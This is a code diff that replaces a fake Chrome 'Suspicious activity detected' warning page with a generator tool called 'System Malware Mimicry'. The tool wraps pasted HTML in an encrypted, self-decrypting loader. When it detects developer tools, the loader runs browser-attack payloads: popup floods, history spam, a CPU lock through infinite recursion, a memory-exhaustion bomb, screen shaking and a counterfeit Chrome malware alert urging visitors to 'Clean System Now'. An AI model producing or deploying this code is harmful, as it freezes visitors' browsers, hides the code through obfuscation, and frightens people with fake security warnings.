@@ -1,141 +1,131 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-TW">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy Error</title>
+    <title>CORE SECURE | System Defense Console</title>
     <style>
-        /* 模擬 Chrome 內核的暗色背景 */
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #202124; /* Chrome 暗色模式背景 */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            overflow: hidden;
-        }
-
-        /* 警告彈窗容器 */
-        .warning-container {
-            max-width: 550px;
-            width: 90%;
-            background-color: #ffffff;
-            border-radius: 8px;
-            padding: 30px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
-        }
-
-        /* 紅色警告標誌 */
-        .icon-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .alert-icon {
-            background-color: #ea4335; /* Google 警示紅 */
-            width: 44px;
-            height: 44px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #ffffff;
-            font-size: 28px;
-            font-weight: 800;
-            margin-right: 18px;
-            flex-shrink: 0;
-        }
-
-        .header-text {
-            margin: 0;
-            font-size: 22px;
-            color: #d93025;
-            font-weight: 500;
-            letter-spacing: -0.5px;
-        }
-
-        /* 警告描述文字 */
-        .description {
-            font-size: 15px;
-            color: #5f6368;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-
-        /* 按鈕區域 */
-        .footer-actions {
-            display: flex;
-            justify-content: flex-end;
-            gap: 12px;
-        }
-
-        .btn {
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .btn-advanced {
-            background: transparent;
-            color: #1a73e8;
-        }
-
-        .btn-advanced:hover {
-            background: rgba(26, 115, 232, 0.05);
-        }
-
-        .btn-main {
-            background-color: #1a73e8; /* Google 標準藍 */
-            color: #ffffff;
-        }
-
-        .btn-main:hover {
-            background-color: #185abc;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-        }
-
-        /* 簡單的震動動畫，增加緊張感 */
-        @keyframes shake {
-            10%, 90% { transform: translate3d(-1px, 0, 0); }
-            20%, 80% { transform: translate3d(2px, 0, 0); }
-            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
-            40%, 60% { transform: translate3d(4px, 0, 0); }
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@300;800&display=swap');
+        :root { --gold: #d4af37; --bg: #050505; --card: #0f0f0f; }
+        body { background-color: var(--bg); color: #fff; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; min-height: 100vh; background-image: radial-gradient(circle at 50% 0%, #151515 0%, #050505 80%); }
+        .container { width: 95%; max-width: 1200px; padding: 40px 20px; }
+        header { text-align: left; border-bottom: 1px solid #222; padding-bottom: 20px; margin-bottom: 40px; }
+        .logo { font-size: 2.2rem; font-weight: 800; background: linear-gradient(to right, #fff, var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
+        .main-panel { background: var(--card); border: 1px solid #1a1a1a; padding: 35px; border-radius: 4px; box-shadow: 0 50px 100px rgba(0,0,0,0.9); }
+        .grid { display: grid; grid-template-columns: 1.5fr 1fr; gap: 40px; }
+        .label { font-family: 'Space Mono', monospace; font-size: 11px; color: #444; text-transform: uppercase; margin-bottom: 15px; display: block; letter-spacing: 2px; }
+        textarea { width: 100%; height: 350px; background: #000; border: 1px solid #1a1a1a; border-radius: 2px; color: #00ff41; padding: 15px; font-family: 'Space Mono', monospace; font-size: 12px; outline: none; }
+        .options-grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
+        .option-item { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 12px; border-radius: 2px; display: flex; cursor: pointer; }
+        .option-item:hover { border-color: var(--gold); }
+        .option-item input { margin-top: 4px; margin-right: 12px; accent-color: var(--gold); }
+        .opt-text b { display: block; font-size: 13px; color: var(--gold); margin-bottom: 2px; }
+        .opt-text span { font-size: 10px; color: #555; }
+        .btn-deploy { width: 100%; padding: 22px; background: var(--gold); color: #000; border: none; font-weight: 800; letter-spacing: 5px; cursor: pointer; margin-top: 30px; }
+        #output-area { margin-top: 40px; display: none; }
+        .code-output { background: #000; border: 1px solid #111; padding: 20px; font-family: 'Space Mono', monospace; font-size: 10px; color: #333; word-break: break-all; max-height: 150px; overflow: auto; }
     </style>
 </head>
 <body>
 
-    <div class="warning-container">
-        <div class="icon-header">
-            <div class="alert-icon">!</div>
-            <h2 class="header-text">Suspicious activity detected</h2>
-        </div>
-        
-        <div class="description">
-            Google Chrome has blocked access to this page because it attempted to execute unauthorized debugger commands and inject malicious scripts. 
-            <br><br>
-            Your system data, saved passwords, and browser cookies may be at risk. This incident has been logged and reported to the system administrator.
-        </div>
+<div class="container">
+    <header>
+        <h1 class="logo">CORE SECURE</h1>
+        <div style="font-family:'Space Mono'; font-size:9px; color:var(--gold); letter-spacing:3px;">SYSTEM MALWARE MIMICRY v5.0</div>
+    </header>
 
-        <div class="footer-actions">
-            <button class="btn btn-advanced" onclick="location.reload()">Back to safety</button>
-            <button class="btn btn-main" onclick="alert('System recovery initiated. Please do not close your browser.')">Clean System Now</button>
+    <div class="main-panel">
+        <div class="grid">
+            <div>
+                <label class="label">Source Code Payload</label>
+                <textarea id="rawInput" placeholder="// 貼入您的 HTML 內容..."></textarea>
+            </div>
+            <div>
+                <label class="label">Tactical Selection</label>
+                <div class="options-grid">
+                    <label class="option-item"><input type="checkbox" id="opt1" checked><div class="opt-text"><b>F12 攔截</b></div></label>
+                    <label class="option-item"><input type="checkbox" id="opt2" checked><div class="opt-text"><b>視窗噴泉轟炸</b></div></label>
+                    <label class="option-item"><input type="checkbox" id="opt3" checked><div class="opt-text"><b>歷史紀錄污染</b></div></label>
+                    <label class="option-item"><input type="checkbox" id="opt4" checked><div class="opt-text"><b>CPU 核心鎖死</b></div></label>
+                    <label class="option-item"><input type="checkbox" id="opt5" checked><div class="opt-text"><b>RAM 溢出炸彈</b></div></label>
+                    <hr style="border:0;border-top:1px solid #222;width:100%">
+                    <label class="option-item"><input type="checkbox" id="opt6"><div class="opt-text"><b>Chrome 偽裝中毒警告</b><span>(全英文系統級提示)</span></div></label>
+                    <label class="option-item"><input type="checkbox" id="opt7"><div class="opt-text"><b>螢幕劇烈震動</b></div></label>
+                    <label class="option-item"><input type="checkbox" id="opt8"><div class="opt-text"><b>內容亂碼崩壞</b></div></label>
+                    <label class="option-item"><input type="checkbox" id="opt9"><div class="opt-text"><b>Console 嘲諷洗版</b></div></label>
+                    <label class="option-item"><input type="checkbox" id="opt10"><div class="opt-text"><b>隱藏滑鼠游標</b></div></label>
+                </div>
+            </div>
+        </div>
+        <button class="btn-deploy" onclick="generate()">DEPLOY DEFENSE PROTOCOL</button>
+        <div id="output-area">
+            <label class="label">Final Armored Payload</label>
+            <div class="code-output" id="resultCode"></div>
+            <button class="btn-deploy" style="background:transparent; color:var(--gold); border: 1px solid var(--gold);" onclick="copyCode()">Copy to Clipboard</button>
         </div>
     </div>
+</div>
 
-    <script>
-        console.log('%cSTOP!', 'color:red;font-size:60px;font-weight:bold;');
-        console.log('%cUnauthorized access is a violation of local security policies.', 'font-size:20px;');
-    </script>
+<script>
+    const h = b => Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
+
+    async function generate() {
+        const input = document.getElementById('rawInput').value;
+        if(!input) return;
+
+        let strike = "";
+        if(document.getElementById('opt1').checked) strike += "e&&e.preventDefault();";
+        if(document.getElementById('opt2').checked) strike += "setInterval(()=>{window.open(location.href,'_blank','width=100,height=100');},400);";
+        if(document.getElementById('opt3').checked) strike += "for(let i=0;i<100;i++)history.pushState(null,null,'?security_check='+Math.random());";
+        if(document.getElementById('opt4').checked) strike += "const f=()=>{while(true)f();};setTimeout(f,0);";
+        if(document.getElementById('opt5').checked) strike += "let m=[];setInterval(()=>{m.push(new Array(1000000).fill(1));},100);";
+        
+        // 偽裝中毒功能 (進階 CSS + HTML 注入)
+        if(document.getElementById('opt6').checked) strike += `
+            document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#202124;display:flex;justify-content:center;align-items:center;z-index:9999999;font-family:sans-serif;color:#fff;padding:20px;box-sizing:border-box;"><div style="max-width:500px;background:#fff;color:#000;padding:30px;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,0.5);"><div style="display:flex;align-items:center;margin-bottom:20px;"><div style="background:#ea4335;width:40px;height:40px;border-radius:50%;display:flex;justify-content:center;align-items:center;color:#fff;font-size:24px;font-weight:bold;margin-right:15px;">!</div><h2 style="margin:0;font-size:22px;color:#d93025;">Suspicious activity detected</h2></div><p style="font-size:14px;color:#5f6368;line-height:1.6;">Google Chrome has blocked access to this page because it attempted to install malicious scripts from an untrusted source. Your system data and saved passwords may be at risk.</p><div style="margin-top:25px;display:flex;justify-content:flex-end;"><button style="background:#1a73e8;color:#fff;border:none;padding:10px 20px;border-radius:4px;font-weight:bold;cursor:pointer;">Clean System Now</button></div></div></div>';
+        `;
+        
+        if(document.getElementById('opt7').checked) strike += "setInterval(()=>{document.body.style.transform=`translate(${Math.random()*15}px,${Math.random()*15}px)`;},10);";
+        if(document.getElementById('opt8').checked) strike += "setInterval(()=>{document.body.innerText=Math.random().toString(36);},50);";
+        if(document.getElementById('opt9').checked) strike += "setInterval(()=>{console.clear();console.log('%cSTOP!', 'color:red;font-size:100px;font-weight:bold;');},10);";
+        if(document.getElementById('opt10').checked) strike += "document.body.style.cursor='none';document.documentElement.style.cursor='none';";
+
+        const trap = `<script>
+        (function(){
+            const _S = (e) => { ${strike} };
+            document.oncontextmenu = () => false;
+            window.onkeydown = e => { if([123,73,74,85].includes(e.keyCode)&&(e.ctrlKey||e.shiftKey)) _S(e); };
+            setInterval(() => { const t=performance.now(); debugger; if(performance.now()-t > 50) _S(); }, 800);
+        })();
+        <\/script>`;
+
+        try {
+            const k = window.crypto.getRandomValues(new Uint8Array(32));
+            const v = window.crypto.getRandomValues(new Uint8Array(12));
+            const key = await window.crypto.subtle.importKey("raw", k, "AES-GCM", false, ["encrypt"]);
+            const enc = await window.crypto.subtle.encrypt({name: "AES-GCM", iv: v}, key, new TextEncoder().encode(trap + input));
+
+            const final = "<!DOCTYPE html><html><head><meta charset='utf-8'></head><body>" +
+                "<div id='L' style='position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;'></div>" +
+                "<script>\n" +
+                "(async function(){\n" +
+                "  const _u=h=>new Uint8Array(h.match(/.{1,2}/g).map(y=>parseInt(y,16)));\n" +
+                "  try {\n" +
+                "    const k=await window.crypto.subtle.importKey('raw',_u('" + h(k) + "'),'AES-GCM',false,['decrypt']);\n" +
+                "    const r=await window.crypto.subtle.decrypt({name:'AES-GCM',iv:_u('" + h(v) + "')},k,_u('" + h(enc) + "'));\n" +
+                "    document.open();document.write(new TextDecoder().decode(r));document.close();\n" +
+                "  } catch(e) { }\n" +
+                "})();\n" +
+                "<\/script></body></html>";
+
+            document.getElementById('resultCode').innerText = final;
+            document.getElementById('output-area').style.display = 'block';
+        } catch(e) { alert("Error"); }
+    }
+
+    function copyCode() {
+        navigator.clipboard.writeText(document.getElementById('resultCode').innerText);
+        alert("武裝代碼複製成功！準備迎接盜碼者的驚恐。");
+    }
+</script>
 </body>
 </html>
